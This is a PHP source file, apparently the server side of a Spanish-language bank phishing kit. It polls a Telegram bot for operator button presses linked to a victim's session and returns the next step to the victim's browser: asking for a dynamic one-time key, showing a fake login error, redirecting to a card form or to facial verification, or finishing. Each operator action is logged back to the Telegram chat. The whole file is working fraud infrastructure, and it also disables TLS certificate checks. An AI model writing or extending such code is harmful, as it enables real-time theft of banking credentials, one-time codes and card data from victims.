<?php
session_start();
header('Content-Type: application/json');
ini_set('display_errors', 0);
error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);

try {
    $config = require __DIR__ . '/config.php';
    $botToken = $config['bot_token'] ?? $config['telegram_bot_token'] ?? '';
    $chatId   = $config['chat_id'] ?? $config['telegram_chat_id'] ?? '';

    $environment = $config['environment'] ?? 'production';
    if ($environment === 'development') {
        // Simulate actions for development
        $actions = ['pedir_dinamica', 'error_logo', 'error_tc', 'facial', 'confirm_finalizar'];
        $action = $actions[array_rand($actions)];
        echo json_encode(['action' => $action]);
        exit;
    }

    $transactionId = trim($_POST['transactionId'] ?? '');
    $messageId = (int)($_POST['messageId'] ?? 0);

    if ($transactionId === '' || $messageId === 0) {
        echo json_encode(['status' => 'error', 'message' => 'Datos incompletos']);
        exit;
    }

    if ($botToken === '' || $chatId === '') {
        echo json_encode(['status' => 'error', 'message' => 'Faltan credenciales del bot']);
        exit;
    }

    ensureWebhookDisabled($botToken);

    $action = consumeTelegramUpdates($botToken, $chatId, $transactionId, $messageId, 'b-34f18_update_id');
    echo json_encode(['action' => $action]);
} catch (Throwable $e) {
    echo json_encode(['action' => null, 'error' => $e->getMessage()]);
}

function ensureWebhookDisabled(string $botToken): void {
    $info = curl_init("https://api.telegram.org/bot{$botToken}/getWebhookInfo");
    curl_setopt_array($info, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false
    ]);
    $response = curl_exec($info);
    curl_close($info);

    $payload = json_decode($response, true);
    if (!empty($payload['result']['url'])) {
        $delete = curl_init("https://api.telegram.org/bot{$botToken}/deleteWebhook");
        curl_setopt_array($delete, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false
        ]);
        curl_exec($delete);
        curl_close($delete);
    }
}

function consumeTelegramUpdates(string $botToken, string $chatId, string $transactionId, int $messageId, string $sessionKey): ?string {
    // First check if action is already received via webhook
    $actionFile = __DIR__ . '/actions/' . $transactionId . '.json';
    if (file_exists($actionFile)) {
        $data = json_decode(file_get_contents($actionFile), true);
        if ($data && isset($data['action'])) {
            // Remove the file after reading
            unlink($actionFile);
            return $data['action'];
        }
    }

    $offsetFile = __DIR__ . '/b-34f18_offset.txt';
    $offset = file_exists($offsetFile) ? (int)file_get_contents($offsetFile) : 0;
    $ch = curl_init("https://api.telegram.org/bot{$botToken}/getUpdates?offset=" . ($offset + 1));
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_TIMEOUT => 5
    ]);
    $response = curl_exec($ch);
    curl_close($ch);

    $data = json_decode($response, true);
    if (!$data || empty($data['result']) || !is_array($data['result'])) {
        return null;
    }

    foreach ($data['result'] as $update) {
        if (!isset($update['callback_query'])) {
            continue;
        }

        $callback = $update['callback_query'];
        $cbData = $callback['data'] ?? '';
        if (strpos($cbData, $transactionId) === false) {
            continue;
        }

        list($actionType) = explode(':', $cbData, 2);
        file_put_contents($offsetFile, $update['update_id'] + 1);

        $msg = $callback['message'] ?? [];
        $origText = $msg['text'] ?? '';
        $origChatId = $msg['chat']['id'] ?? $chatId;
        $origMsgId = $msg['message_id'] ?? $messageId;

        $newText = buildEditedText($origText, $actionType, $callback['from'] ?? []);

        $editPayload = [
            'chat_id' => $origChatId,
            'message_id' => $origMsgId,
            'text' => $newText,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode(['inline_keyboard' => []])
        ];

        $edit = curl_init("https://api.telegram.org/bot{$botToken}/editMessageText");
        curl_setopt_array($edit, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => json_encode($editPayload),
            CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false
        ]);
        curl_exec($edit);
        curl_close($edit);

        return $actionType;
    }

    return null;
}

function buildEditedText(string $baseText, string $actionType, array $from): string {
    $operator = !empty($from['username'])
        ? '@' . $from['username']
        : trim(($from['first_name'] ?? '') . ' ' . ($from['last_name'] ?? ''));
    if ($operator === '') {
        $operator = 'Operador';
    }

    switch ($actionType) {
        case 'pedir_dinamica':
            $label = 'Pidió DINÁMICA';
            break;
        case 'error_logo':
            $label = 'Marcó ERROR DE LOGO';
            break;
        case 'error_tc':
        case 'tarjeta':
            $label = 'Redirigió a TARJETA';
            break;
        case 'facial':
            $label = 'Redirigió a VERIFICACIÓN FACIAL';
            break;
        case 'confirm_finalizar':
            $label = 'FINALIZÓ la operación';
            break;
        default:
            $label = strtoupper($actionType);
    }

    $text = $baseText !== '' ? $baseText : 'Operación en curso';
    $text .= "\n\n————————————\n";
    $text .= "✅ Acción: <b>{$label}</b>\n";
    $text .= "👤 Operador: <b>{$operator}</b>";
    return $text;
}


